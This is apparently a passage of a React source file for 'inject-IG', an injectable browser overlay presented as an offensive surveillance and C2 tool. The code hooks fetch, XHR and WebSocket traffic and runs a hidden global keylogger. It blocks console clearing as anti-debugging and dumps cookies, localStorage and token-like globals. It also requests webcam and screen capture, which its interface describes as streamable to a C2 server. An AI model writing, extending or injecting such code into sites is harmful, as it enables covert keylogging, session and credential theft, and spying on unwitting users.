import React, { useState, useEffect, useRef, useCallback } from 'react';
import { 
  Terminal, Activity, Search, 
  FolderOpen, FileCode, FileJson, FileText, 
  Key, Eye, Download, Box, FileArchive, LayoutTemplate, Zap,
  Video, Camera, PhoneOff, AlertTriangle, Monitor,
  Wifi, MousePointer, Shield, Radio, Skull, Crosshair
} from 'lucide-react';

export default function App() {
  // Estados de Interface Clássicos
  const [isOpen, setIsOpen] = useState(false);
  const [isExpanded, setIsExpanded] = useState(false);
  const [activeTab, setActiveTab] = useState('console'); 
  const [dragPos, setDragPos] = useState({ x: 0, y: 0 });
  const [isDragging, setIsDragging] = useState(false);
  const dragRef = useRef(null);

  // Estados de Ficheiros e Artefatos
  const [isScanning, setIsScanning] = useState(false);
  const [selectedFile, setSelectedFile] = useState(null);
  const [systemFiles, setSystemFiles] = useState([]);
  const [extractedArtifacts, setExtractedArtifacts] = useState([]);
  const [selectedArtifact, setSelectedArtifact] = useState(null);
  const [newArtifactBadge, setNewArtifactBadge] = useState(0);

  // Estados do Terminal
  const [cmdInput, setCmdInput] = useState('');
  const [cmdHistory, setCmdHistory] = useState([
    " inject-IG macOS Engine v8.0 (ULTIMATE EDITION)",
    "Kernel Space Loaded. Network Sniffing ACTIVE. Telemetry ACTIVE.",
    "",
    "Digite 'help' para listar os módulos táticos."
  ]);
  const cmdEndRef = useRef(null);
  const cmdInputRef = useRef(null);

  // Estados dos Novos Módulos (C2, Hardware, Telemetria, Network)
  const [mediaStream, setMediaStream] = useState(null);
  const [mediaError, setMediaError] = useState(null);
  const [isScreenShare, setIsScreenShare] = useState(false);
  const videoRef = useRef(null);

  const [networkLogs, setNetworkLogs] = useState([]);
  const [telemetryLogs, setTelemetryLogs] = useState([]);
  const [godModeActive, setGodModeActive] = useState(false);

  /* STREAMING_CHUNK: Setup de Interceção Global (Network, Keylogger, Anti-Debug) */
  useEffect(() => {
    // 1. Bypass Anti-Debugger (Protege o console)
    const originalClear = console.clear;
    console.clear = () => { console.log("[INJECT-IG] Tentativa de limpeza do console bloqueada (Anti-Debugger)."); };

    // 2. Intercetador de FETCH
    const originalFetch = window.fetch;
    window.fetch = async function(...args) {
      const url = typeof args[0] === 'string' ? args[0] : (args[0]?.url || 'URL Desconhecida');
      const method = args[1]?.method || 'GET';
      const logEntry = { id: Date.now(), type: 'FETCH', method, url, time: new Date().toLocaleTimeString() };
      
      try {
        const response = await originalFetch.apply(this, args);
        setNetworkLogs(prev => [{...logEntry, status: response.status}, ...prev]);
        return response;
      } catch (error) {
        setNetworkLogs(prev => [{...logEntry, status: 'ERROR'}, ...prev]);
        throw error;
      }
    };

    // 3. Intercetador de XHR (AJAX)
    const originalXHROpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url) {
      this.addEventListener('load', function() {
        setNetworkLogs(prev => [{ id: Date.now(), type: 'XHR', method, url, status: this.status, time: new Date().toLocaleTimeString() }, ...prev]);
      });
      this.addEventListener('error', function() {
        setNetworkLogs(prev => [{ id: Date.now(), type: 'XHR', method, url, status: 'ERROR', time: new Date().toLocaleTimeString() }, ...prev]);
      });
      originalXHROpen.apply(this, arguments);
    };

    // 4. Intercetador de WebSockets
    const OriginalWebSocket = window.WebSocket;
    if (OriginalWebSocket) {
      window.WebSocket = function(url, protocols) {
        const ws = new OriginalWebSocket(url, protocols);
        setNetworkLogs(prev => [{ id: Date.now(), type: 'WEBSOCKET', method: 'WS', url, status: 'OPENING', time: new Date().toLocaleTimeString() }, ...prev]);
        ws.addEventListener('message', (e) => {
          setNetworkLogs(prev => [{ id: Date.now() + Math.random(), type: 'WS_MSG', method: 'RECV', url, status: 'MSG', time: new Date().toLocaleTimeString(), payload: (typeof e.data === 'string' ? e.data.substring(0, 50) + '...' : 'Binary Data') }, ...prev]);
        });
        return ws;
      };
      window.WebSocket.prototype = OriginalWebSocket.prototype;
    }

    // 5. Telemetria e Keylogger
    const handleGlobalKey = (e) => {
      if (e.target.closest('#inject-ig-root')) return; // Ignora o próprio painel
      setTelemetryLogs(prev => [{ id: Date.now(), type: 'KEY', data: e.key, time: new Date().toLocaleTimeString() }, ...prev]);
    };
    const handleGlobalClick = (e) => {
      if (e.target.closest('#inject-ig-root')) return;
      setTelemetryLogs(prev => [{ id: Date.now(), type: 'CLICK', data: `<${e.target.tagName.toLowerCase()}> class="${e.target.className}"`, time: new Date().toLocaleTimeString() }, ...prev]);
    };

    window.addEventListener('keyup', handleGlobalKey, true);
    window.addEventListener('click', handleGlobalClick, true);

    return () => {
      console.clear = originalClear;
      window.fetch = originalFetch;
      XMLHttpRequest.prototype.open = originalXHROpen;
      window.WebSocket = OriginalWebSocket;
      window.removeEventListener('keyup', handleGlobalKey, true);
      window.removeEventListener('click', handleGlobalClick, true);
    };
  }, []);

  /* STREAMING_CHUNK: God Mode (Inspetor DOM Dinâmico) */
  useEffect(() => {
    if (!godModeActive) return;

    const handleMouseOver = (e) => {
      if (e.target.closest('#inject-ig-root')) return;
      e.target.dataset.igOldOutline = e.target.style.outline;
      e.target.dataset.igOldCursor = e.target.style.cursor;
      e.target.style.outline = '2px solid #ef4444';
      e.target.style.cursor = 'crosshair';
      e.stopPropagation();
    };

    const handleMouseOut = (e) => {
      if (e.target.closest('#inject-ig-root')) return;
      e.target.style.outline = e.target.dataset.igOldOutline || '';
      e.target.style.cursor = e.target.dataset.igOldCursor || '';
    };

    const handleClick = (e) => {
      if (e.target.closest('#inject-ig-root')) return;
      e.preventDefault();
      e.stopPropagation();
      
      // Captura o HTML do elemento clicado
      const elementHtml = e.target.outerHTML;
      const artifact = createArtifact(`godmode_capture_${Date.now()}.html`, 'code', elementHtml);
      
      // Limpa os estilos do God Mode da cópia
      e.target.style.outline = e.target.dataset.igOldOutline || '';
      e.target.style.cursor = e.target.dataset.igOldCursor || '';
      
      setGodModeActive(false); // Desativa após clicar
      setActiveTab('artifacts'); // Vai direto para os relatórios ver o código roubado
      setSelectedArtifact(artifact);
    };

    document.body.addEventListener('mouseover', handleMouseOver, true);
    document.body.addEventListener('mouseout', handleMouseOut, true);
    document.body.addEventListener('click', handleClick, true);

    return () => {
      document.body.removeEventListener('mouseover', handleMouseOver, true);
      document.body.removeEventListener('mouseout', handleMouseOut, true);
      document.body.removeEventListener('click', handleClick, true);
    };
  }, [godModeActive]);

  /* STREAMING_CHUNK: Handlers e Shortcuts Resilientes */
  useEffect(() => {
    const handleKeyDown = (e) => {
      if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.code === 'KeyD' || e.key.toLowerCase() === 'd')) {
        e.preventDefault();
        e.stopPropagation();
        setIsOpen(prev => !prev);
      }
    };
    window.addEventListener('keydown', handleKeyDown, true);
    return () => window.removeEventListener('keydown', handleKeyDown, true);
  }, []);

  useEffect(() => {
    if (cmdEndRef.current) cmdEndRef.current.scrollIntoView({ behavior: 'smooth' });
  }, [cmdHistory, activeTab]);

  useEffect(() => {
    if (activeTab === 'console' && cmdInputRef.current && isOpen) {
        setTimeout(() => cmdInputRef.current.focus(), 100);
    }
  }, [activeTab, isOpen]);

  useEffect(() => { if (!isOpen && mediaStream) stopMedia(); }, [isOpen]);

  const handleMouseDown = (e) => {
    if (isExpanded) return;
    setIsDragging(true);
    dragRef.current = { startX: e.clientX - dragPos.x, startY: e.clientY - dragPos.y };
  };

  const handleMouseMove = useCallback((e) => {
    if (!isDragging || isExpanded) return;
    setDragPos({ x: e.clientX - dragRef.current.startX, y: e.clientY - dragRef.current.startY });
  }, [isDragging, isExpanded]);

  const handleMouseUp = () => setIsDragging(false);

  useEffect(() => {
    if (isDragging) {
      window.addEventListener('mousemove', handleMouseMove);
      window.addEventListener('mouseup', handleMouseUp);
    } else {
      window.removeEventListener('mousemove', handleMouseMove);
      window.removeEventListener('mouseup', handleMouseUp);
    }
    return () => { window.removeEventListener('mousemove', handleMouseMove); window.removeEventListener('mouseup', handleMouseUp); };
  }, [isDragging, handleMouseMove]);

  /* STREAMING_CHUNK: Funções Core */
  const createArtifact = (name, type, content) => {
    const newArtifact = { id: Date.now(), name, type, content, timestamp: new Date().toLocaleTimeString() };
    setExtractedArtifacts(prev => [newArtifact, ...prev]); 
    setNewArtifactBadge(prev => prev + 1);
    return newArtifact;
  };

  const handleDownload = (file) => {
    if (!file) return;
    const blob = new Blob([file.content], { type: 'text/plain;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = file.name;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  const processCommand = (e) => {
    if (e.key === 'Enter') {
      const command = cmdInput.trim();
      if (!command) return;

      let newHistory = [...cmdHistory, `\n~ % ${command}`];
      const cmdParts = command.split(' ');
      const mainCmd = cmdParts[0].toLowerCase();

      const print = (text) => { newHistory.push(text); };

      try {
        switch (mainCmd) {
          case 'help':
            print("=== MÓDULOS DE AUDITORIA E C2 ===");
            print("  search <termo>   - Varre o código do site");
            print("  extract <alvo>   - Extrai (emails | links | inputs)");
            print("  scan <alvo>      - Analisa (dom | state | globals | framework)");
            print("  audit <alvo>     - Automação (security | cve)");
            print("  cls              - Limpa o console");
            break;

          case 'cls': case 'clear': newHistory = []; break;

          case 'audit':
            const auditTarget = cmdParts[1]?.toLowerCase();
            if (auditTarget === 'security') {
              print(" Executando Auditoria de Segurança Automática...");
              let report = "=== RELATÓRIO DE SEGURANÇA ===\n\n";
              report += `Protocolo: ${window.location.protocol === 'https:' ? 'Seguro (HTTPS)' : 'Vulnerável (HTTP)'}\n`;
              report += `Cookies Seguros: ${document.cookie.includes('Secure') ? 'Sim' : 'Não detetado'}\n`;
              report += `Modo de Quirks: ${document.compatMode === 'CSS1Compat' ? 'Padrão' : 'Quirks (Perigoso)'}\n`;
              report += `Referrer Policy: ${document.referrerPolicy || 'Padrão (Potencial fuga)'}\n`;
              createArtifact('auditoria_seguranca.txt', 'text', report);
              print("  ✓ Auditoria concluída. Relatório nos Artefatos.");
            } else if (auditTarget === 'cve') {
              print(" Vasculhando por Bibliotecas Vulneráveis (CVE Checker)...");
              let cves = [];
              if (window.jQuery && window.jQuery.fn && window.jQuery.fn.jquery) cves.push(`jQuery detetado: Versão ${window.jQuery.fn.jquery}`);
              if (window.React) cves.push(`React Global detetado (Risco de exposição de estado)`);
              if (window.angular) cves.push(`AngularJS Clássico detetado`);
              createArtifact('analise_cve_libs.txt', 'text', cves.join('\n') || "Nenhuma lib global clássica detetada.");
              print(cves.length > 0 ? `  ✓ ${cves.length} assinaturas encontradas.` : "  ✓ Sistema aparentemente limpo.");
            } else {
              print("Alvo inválido. Use: audit security | audit cve");
            }
            break;

          case 'scan':
            const scanTarget = cmdParts[1]?.toLowerCase();
            if (scanTarget === 'dom') {
              createArtifact('snapshot_completo_dom.html', 'code', document.documentElement.outerHTML);
              print("  ✓ Arquivo DOM clonado.");
            } else if (scanTarget === 'state') {
              let storageData = "=== LOCAL STORAGE ===\n";
              for (let i = 0; i < localStorage.length; i++) storageData += `${localStorage.key(i)}: ${localStorage.getItem(localStorage.key(i))}\n`;
              createArtifact('banco_de_dados_local.json', 'json', storageData);
              print("  ✓ Dump de Storage clonado.");
            } else if (scanTarget === 'globals') {
              const suspiciousKeys = Object.keys(window).filter(k => k.toLowerCase().includes('token') || k.toLowerCase().includes('key') || k.toLowerCase().includes('secret'));
              createArtifact('variaveis_globais_suspeitas.txt', 'text', suspiciousKeys.join('\n') || "Nenhuma variável suspeita.");
              print(`  ✓ ${suspiciousKeys.length} chaves expostas encontradas.`);
            } else {
              print("Alvo inválido. Use: scan dom | scan state | scan globals");
            }
            break;

          case 'extract':
            const extractTarget = cmdParts[1]?.toLowerCase();
            if (extractTarget === 'emails') {
              const emails = document.documentElement.innerHTML.match(/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)/gi);
              const uniqueEmails = emails ? [...new Set(emails)] : [];
              createArtifact('emails_vazados.txt', 'text', uniqueEmails.join('\n') || "Nenhum e-mail exposto.");
              print(`  ✓ ${uniqueEmails.length} e-mails extraídos.`);
            } else if (extractTarget === 'links') {
              const links = Array.from(document.links).map(a => a.href).filter(h => h.startsWith('http'));
              createArtifact('rotas_externas.txt', 'code', [...new Set(links)].join('\n'));
              print(`  ✓ ${[...new Set(links)].length} URLs mapeadas.`);
            } else if (extractTarget === 'inputs') {
              const inputs = Array.from(document.querySelectorAll('input, textarea')).map(i => `Tipo: ${i.type} | Name: ${i.name || 'N/A'}`);
              createArtifact('vetores_entrada.txt', 'code', inputs.join('\n') || "Nenhum input encontrado.");
              print(`  ✓ ${inputs.length} vetores mapeados.`);
            } else {
              print("Alvo inválido. Use: extract emails | links | inputs");
            }
            break;

          case 'search':
            const term = cmdParts.slice(1).join(' ');
            if (!term) { print("Erro: Digite a palavra. Ex: search senha"); } else {
              const matches = document.documentElement.innerHTML.split('\n').filter(line => line.toLowerCase().includes(term.toLowerCase()));
              createArtifact(`busca_${term.replace(/\s+/g, '_')}.txt`, 'code', matches.map(m => m.trim()).join('\n\n') || "Nada encontrado.");
              print(`  ✓ ${matches.length} linhas encontradas.`);
            }
            break;

          default: print(`Comando não encontrado: ${mainCmd}`);
        }
      } catch (error) { print(`[ERRO KERNEL]: ${error.message}`); }

      setCmdHistory(newHistory);
      setCmdInput('');
    }
  };

  const scanSiteArchitecture = () => {
    setIsScanning(true);
    setSelectedFile(null);
    setTimeout(() => {
      const cookies = document.cookie.split(';').map(c => c.trim()).join('\n') || "Nenhum cookie visível.";
      const scripts = Array.from(document.scripts).map(s => s.src || "[Inline Script]").join('\n');
      setSystemFiles([
        { name: "Armazenamento", type: "folder", children: [ { name: "cookies_sessao.txt", type: "json", content: cookies }, { name: "local_storage.json", type: "json", content: JSON.stringify(localStorage, null, 2) } ] },
        { name: "Memória", type: "folder", children: [ { name: "scripts.js", type: "code", content: scripts } ] }
      ]);
      setIsScanning(false);
    }, 600);
  };

  /* STREAMING_CHUNK: Funções de Solicitação de Hardware (Cam e Ecrã) */
  const requestMediaAccess = async (type) => {
    setMediaError(null);
    try {
      let stream;
      if (type === 'screen') {
        stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: true });
        setIsScreenShare(true);
      } else {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
        setIsScreenShare(false);
      }
      
      setMediaStream(stream);
      setTimeout(() => { if (videoRef.current) videoRef.current.srcObject = stream; }, 100);
      setCmdHistory(prev => [...prev, `\n~ % [ALVO] Permissão concedida: ${type === 'screen' ? 'Partilha de Ecrã' : 'Câmara Web'}.`]);

      // Se o usuário parar de partilhar pelo botão nativo do chrome
      stream.getVideoTracks()[0].onended = () => stopMedia();
    } catch (err) {
      setMediaError(`Acesso negado ou hardware indisponível (${type}).`);
      setCmdHistory(prev => [...prev, `\n~ % [ALVO - RECUSADO] Permissão de ${type} negada.`]);
    }
  };

  const stopMedia = () => {
    if (mediaStream) {
      mediaStream.getTracks().forEach(track => track.stop());
      setMediaStream(null);
      setIsScreenShare(false);
      if (videoRef.current) videoRef.current.srcObject = null;
      setCmdHistory(prev => [...prev, `\n~ % [ALVO] Conexão remota encerrada.`]);
    }
  };

  /* STREAMING_CHUNK: Renders de Interface (Novas Abas: Network, Telemetry) */
  const renderNetworkModule = () => (
    <div style={{ display: 'flex', flexDirection: 'column', height: '100%', backgroundColor: 'rgba(9,9,11,0.8)', pointerEvents: 'auto' }}>
      <div style={{ padding: '12px 24px', borderBottom: '1px solid rgba(255,255,255,0.1)', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
        <div>
          <h3 style={{ fontSize: '14px', fontWeight: 'bold', color: 'white', display: 'flex', alignItems: 'center' }}><Wifi size={16} style={{marginRight: '8px', color: '#60A5FA'}}/> Intercetador de Redes</h3>
          <p style={{ fontSize: '11px', color: '#A1A1AA', marginTop: '2px' }}>Capturando Fetch, XHR e WebSockets em tempo real</p>
        </div>
        <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
          <div style={{ width: '8px', height: '8px', borderRadius: '50%', backgroundColor: '#34D399', boxShadow: '0 0 8px #34D399', animation: 'pulse 2s infinite' }}></div>
          <span style={{ fontSize: '10px', color: '#34D399', fontWeight: 'bold' }}>SNIFFING</span>
        </div>
      </div>
      <div style={{ flex: 1, overflowY: 'auto', padding: '16px' }}>
        {networkLogs.length === 0 ? (
          <div style={{ color: '#52525B', fontSize: '13px', textAlign: 'center', marginTop: '40px' }}>Nenhum tráfego de rede detetado ainda.</div>
        ) : (
          <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
            {networkLogs.map(log => (
              <div key={log.id} style={{ display: 'flex', backgroundColor: 'rgba(255,255,255,0.02)', border: '1px solid rgba(255,255,255,0.05)', borderRadius: '8px', padding: '10px 12px', alignItems: 'center' }}>
                <span style={{ fontSize: '10px', fontWeight: 'bold', width: '60px', color: log.type === 'WEBSOCKET' ? '#C084FC' : log.method === 'GET' ? '#60A5FA' : '#34D399' }}>{log.method}</span>
                <span style={{ fontSize: '12px', color: '#E4E4E7', flex: 1, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', fontFamily: 'monospace' }}>{log.url}</span>
                {log.payload && <span style={{ fontSize: '11px', color: '#A1A1AA', flex: 1, marginLeft: '12px', fontStyle: 'italic', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{log.payload}</span>}
                <span style={{ fontSize: '11px', fontWeight: 'bold', color: log.status === 'ERROR' || log.status >= 400 ? '#FB7185' : '#34D399', width: '60px', textAlign: 'right' }}>{log.status}</span>
                <span style={{ fontSize: '10px', color: '#71717A', width: '60px', textAlign: 'right' }}>{log.time}</span>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );

  const renderTelemetryModule = () => (
    <div style={{ display: 'flex', flexDirection: 'column', height: '100%', backgroundColor: 'rgba(9,9,11,0.8)', pointerEvents: 'auto' }}>
      <div style={{ padding: '12px 24px', borderBottom: '1px solid rgba(255,255,255,0.1)', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
        <div>
          <h3 style={{ fontSize: '14px', fontWeight: 'bold', color: 'white', display: 'flex', alignItems: 'center' }}><MousePointer size={16} style={{marginRight: '8px', color: '#F472B6'}}/> Keylogger & Telemetria</h3>
          <p style={{ fontSize: '11px', color: '#A1A1AA', marginTop: '2px' }}>Gravando interações do alvo invisivelmente</p>
        </div>
      </div>
      <div style={{ flex: 1, overflowY: 'auto', padding: '16px', display: 'flex', flexDirection: 'column', gap: '4px' }}>
        {telemetryLogs.length === 0 ? (
          <div style={{ color: '#52525B', fontSize: '13px', textAlign: 'center', marginTop: '40px' }}>A aguardar interação do utilizador...</div>
        ) : (
          telemetryLogs.map(log => (
            <div key={log.id} style={{ display: 'flex', alignItems: 'flex-start', padding: '6px 0', borderBottom: '1px solid rgba(255,255,255,0.02)' }}>
              <span style={{ fontSize: '10px', color: '#71717A', width: '70px', marginTop: '2px' }}>{log.time}</span>
              <span style={{ fontSize: '10px', fontWeight: 'bold', padding: '2px 6px', borderRadius: '4px', backgroundColor: log.type === 'KEY' ? 'rgba(244, 114, 182, 0.1)' : 'rgba(96, 165, 250, 0.1)', color: log.type === 'KEY' ? '#F472B6' : '#60A5FA', marginRight: '12px', width: '45px', textAlign: 'center' }}>{log.type}</span>
              <span style={{ fontSize: '13px', color: '#E4E4E7', fontFamily: 'monospace' }}>{log.data === ' ' ? '[ESPAÇO]' : log.data}</span>
            </div>
          ))
        )}
      </div>
    </div>
  );

  /* (Módulos originais compactados) */
  const renderArtifactsMenu = () => (
    <div style={{ display: 'flex', flex: 1, height: '100%', overflow: 'hidden', pointerEvents: 'auto' }}>
      <div style={{ width: '33.33%', minWidth: '250px', borderRight: '1px solid rgba(255,255,255,0.1)', backgroundColor: 'rgba(0,0,0,0.2)', display: 'flex', flexDirection: 'column' }}>
        <div style={{ padding: '12px', borderBottom: '1px solid rgba(255,255,255,0.1)', backgroundColor: 'rgba(255,255,255,0.05)', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
          <span style={{ fontSize: '12px', fontWeight: 600, letterSpacing: '0.05em', color: '#A1A1AA', textTransform: 'uppercase' }}>Relatórios</span>
          <span style={{ backgroundColor: 'rgba(59, 130, 246, 0.2)', color: '#60A5FA', fontSize: '10px', padding: '2px 8px', borderRadius: '9999px', fontWeight: 'bold' }}>{extractedArtifacts.length}</span>
        </div>
        <div style={{ flex: 1, overflowY: 'auto', padding: '8px', display: 'flex', flexDirection: 'column', gap: '4px' }}>
          {extractedArtifacts.map(art => (
            <div key={art.id} onClick={(e) => { e.stopPropagation(); setSelectedArtifact(art); }} style={{ padding: '12px', borderRadius: '12px', cursor: 'pointer', border: '1px solid', backgroundColor: selectedArtifact?.id === art.id ? 'rgba(255,255,255,0.1)' : 'transparent', borderColor: selectedArtifact?.id === art.id ? 'rgba(255,255,255,0.2)' : 'transparent', pointerEvents: 'auto' }}>
              <div style={{ display: 'flex', alignItems: 'center', fontSize: '14px', fontWeight: 500, color: '#E4E4E7' }}><FileArchive size={14} color="#60A5FA" style={{marginRight: '8px'}} /><span style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{art.name}</span></div>
              <div style={{ fontSize: '10px', color: '#71717A', marginTop: '4px', marginLeft: '24px' }}>{art.timestamp}</div>
            </div>
          ))}
        </div>
      </div>
      <div style={{ display: 'flex', flex: 1, flexDirection: 'column', backgroundColor: 'rgba(9,9,11,0.4)', position: 'relative' }}>
        {selectedArtifact ? (
          <>
            <div style={{ height: '56px', borderBottom: '1px solid rgba(255,255,255,0.1)', display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '0 24px', backgroundColor: 'rgba(255,255,255,0.02)', backdropFilter: 'blur(12px)' }}>
              <span style={{ fontSize: '14px', fontWeight: 600, color: 'white' }}>{selectedArtifact.name}</span>
              <button onClick={(e) => { e.stopPropagation(); handleDownload(selectedArtifact); }} style={{ display: 'flex', alignItems: 'center', padding: '8px 16px', backgroundColor: '#2563EB', color: 'white', borderRadius: '8px', fontSize: '12px', fontWeight: 500, border: 'none', cursor: 'pointer', pointerEvents: 'auto' }}><Download size={14} style={{marginRight: '8px'}} />Baixar</button>
            </div>
            <textarea style={{ flex: 1, width: '100%', backgroundColor: 'transparent', resize: 'none', padding: '24px', fontFamily: 'monospace', fontSize: '13px', color: '#D4D4D8', outline: 'none', border: 'none', pointerEvents: 'auto' }} readOnly value={selectedArtifact.content} />
          </>
        ) : (<div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#52525B' }}>Selecione um relatório.</div>)}
      </div>
    </div>
  );

  const renderMediaModule = () => (
    <div style={{ display: 'flex', flex: 1, flexDirection: 'column', height: '100%', backgroundColor: 'rgba(9,9,11,0.6)', pointerEvents: 'auto', padding: '24px', alignItems: 'center', justifyContent: 'center' }}>
      {!mediaStream ? (
        <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', maxWidth: '450px', textAlign: 'center' }}>
          <div style={{ width: '80px', height: '80px', borderRadius: '50%', backgroundColor: 'rgba(168, 85, 247, 0.1)', display: 'flex', alignItems: 'center', justifyContent: 'center', marginBottom: '24px', border: '1px solid rgba(168, 85, 247, 0.3)' }}>
            <Radio size={32} color="#A855F7" />
          </div>
          <h2 style={{ fontSize: '18px', fontWeight: 600, color: 'white', marginBottom: '12px' }}>Vigilância Remota de Hardware</h2>
          <p style={{ fontSize: '13px', color: '#A1A1AA', lineHeight: '1.6', marginBottom: '24px' }}>Solicite acesso à câmara ou ao ecrã do alvo. O fluxo de vídeo pode ser redirecionado para o servidor de C2 via WebRTC.</p>
          {mediaError && <div style={{ backgroundColor: 'rgba(225, 29, 72, 0.1)', border: '1px solid rgba(225, 29, 72, 0.3)', padding: '12px', borderRadius: '8px', marginBottom: '24px', display: 'flex', alignItems: 'center', width: '100%' }}><AlertTriangle size={16} color="#FB7185" style={{ marginRight: '12px', flexShrink: 0 }} /><span style={{ fontSize: '12px', color: '#FB7185', textAlign: 'left' }}>{mediaError}</span></div>}
          <div style={{ display: 'flex', gap: '12px' }}>
            <button onClick={(e) => { e.stopPropagation(); requestMediaAccess('camera'); }} style={{ display: 'flex', alignItems: 'center', padding: '12px 20px', backgroundColor: '#9333EA', color: 'white', borderRadius: '8px', fontSize: '13px', fontWeight: 500, border: 'none', cursor: 'pointer', pointerEvents: 'auto' }}><Video size={16} style={{marginRight: '8px'}} /> Câmara do Alvo</button>
            <button onClick={(e) => { e.stopPropagation(); requestMediaAccess('screen'); }} style={{ display: 'flex', alignItems: 'center', padding: '12px 20px', backgroundColor: '#2563EB', color: 'white', borderRadius: '8px', fontSize: '13px', fontWeight: 500, border: 'none', cursor: 'pointer', pointerEvents: 'auto' }}><Monitor size={16} style={{marginRight: '8px'}} /> Partilhar Ecrã</button>
          </div>
        </div>
      ) : (
        <div style={{ width: '100%', maxWidth: '800px', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
          <div style={{ width: '100%', position: 'relative', borderRadius: '16px', overflow: 'hidden', border: '1px solid rgba(255,255,255,0.1)', boxShadow: '0 25px 50px -12px rgba(0, 0, 0, 0.5)', backgroundColor: 'black' }}>
            <video ref={videoRef} autoPlay playsInline muted style={{ width: '100%', height: 'auto', display: 'block', transform: isScreenShare ? 'none' : 'scaleX(-1)' }} />
            <div style={{ position: 'absolute', top: '16px', left: '16px', display: 'flex', alignItems: 'center', backgroundColor: 'rgba(0,0,0,0.6)', padding: '6px 12px', borderRadius: '9999px', backdropFilter: 'blur(4px)' }}><div style={{ width: '8px', height: '8px', borderRadius: '50%', backgroundColor: '#EF4444', marginRight: '8px', boxShadow: '0 0 8px #EF4444' }}></div><span style={{ fontSize: '12px', fontWeight: 500, color: 'white', letterSpacing: '0.05em' }}>{isScreenShare ? 'ECRÃ DO ALVO' : 'CÂMARA DO ALVO'}</span></div>
          </div>
          <button onClick={(e) => { e.stopPropagation(); stopMedia(); }} style={{ marginTop: '24px', display: 'flex', alignItems: 'center', padding: '10px 20px', backgroundColor: 'rgba(239, 68, 68, 0.1)', color: '#F87171', border: '1px solid rgba(239, 68, 68, 0.3)', borderRadius: '8px', fontSize: '13px', fontWeight: 500, cursor: 'pointer', pointerEvents: 'auto' }}><PhoneOff size={16} style={{marginRight: '8px'}} /> Encerrar Ligação</button>
        </div>
      )}
    </div>
  );

  const renderExplorer = () => (
    <div style={{ display: 'flex', flex: 1, flexDirection: 'column', height: '100%', backgroundColor: 'rgba(0,0,0,0.2)', pointerEvents: 'auto' }}>
      <div style={{ padding: '12px', borderBottom: '1px solid rgba(255,255,255,0.1)', backgroundColor: 'rgba(255,255,255,0.05)', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
        <span style={{ fontSize: '12px', fontWeight: 500, color: '#A1A1AA' }}>Raiz do Sistema</span>
        <button onClick={(e) => { e.stopPropagation(); scanSiteArchitecture(); }} disabled={isScanning} style={{ display: 'flex', alignItems: 'center', padding: '6px 12px', backgroundColor: 'rgba(255,255,255,0.1)', color: 'white', borderRadius: '6px', fontSize: '12px', border: 'none', cursor: 'pointer', pointerEvents: 'auto' }}>{isScanning ? <Activity size={12} style={{marginRight: '8px'}} className="animate-spin" /> : <Search size={12} style={{marginRight: '8px'}} />}Mapear</button>
      </div>
      <div style={{ display: 'flex', flex: 1, overflow: 'hidden' }}>
        <div style={{ width: '33.33%', minWidth: '250px', borderRight: '1px solid rgba(255,255,255,0.1)', padding: '8px', overflowY: 'auto' }}>
          {systemFiles.map(node => {
            const renderNode = (n, d=0) => (
              <div key={n.name} style={{ paddingLeft: `${d * 16}px` }}>
                <div style={{ display: 'flex', alignItems: 'center', padding: '6px 8px', cursor: 'pointer', borderRadius: '6px', backgroundColor: selectedFile?.name === n.name && n.type !== 'folder' ? 'rgba(59, 130, 246, 0.2)' : 'transparent', color: selectedFile?.name === n.name && n.type !== 'folder' ? '#60A5FA' : '#D4D4D8', pointerEvents: 'auto' }} onClick={(e) => { e.stopPropagation(); if(n.type !== 'folder') setSelectedFile(n); }}>
                  {n.type === 'folder' ? <FolderOpen size={14} color="#60A5FA" style={{marginRight: '8px'}} /> : <FileCode size={14} color="#A1A1AA" style={{marginRight: '8px'}} />}
                  <span style={{fontSize: '13px'}}>{n.name}</span>
                </div>
                {n.children && n.children.map(c => renderNode(c, d + 1))}
              </div>
            );
            return renderNode(node);
          })}
        </div>
        <div style={{ display: 'flex', flex: 1, backgroundColor: 'rgba(9,9,11,0.4)', padding: '16px' }}>
           {selectedFile && <textarea style={{ flex: 1, width: '100%', backgroundColor: 'rgba(0,0,0,0.4)', padding: '16px', fontFamily: 'monospace', fontSize: '13px', color: '#D4D4D8', outline: 'none', resize: 'none', border: '1px solid rgba(255,255,255,0.1)', borderRadius: '12px', pointerEvents: 'auto' }} readOnly value={selectedFile.content} />}
        </div>
      </div>
    </div>
  );

  const renderConsole = () => (
    <div style={{ height: '100%', backgroundColor: 'rgba(9,9,11,0.8)', color: '#D4D4D8', fontFamily: 'monospace', fontSize: '13px', padding: '16px', overflowY: 'auto', cursor: 'text', borderBottomRightRadius: '16px', pointerEvents: 'auto' }} onClick={(e) => { e.stopPropagation(); cmdInputRef.current && cmdInputRef.current.focus(); }}>
      {cmdHistory.map((line, i) => (
        <div key={i} style={{ whiteSpace: 'pre-wrap', lineHeight: '1.625', color: line.includes('ERRO') || line.includes('RECUSADO') ? '#FB7185' : line.includes('✓') || line.includes('ALVO]') ? '#34D399' : line.includes('===') ? '#60A5FA' : 'inherit', fontWeight: line.includes('===') ? 'bold' : 'normal', marginTop: line.includes('===') ? '8px' : '0' }}>{line}</div>
      ))}
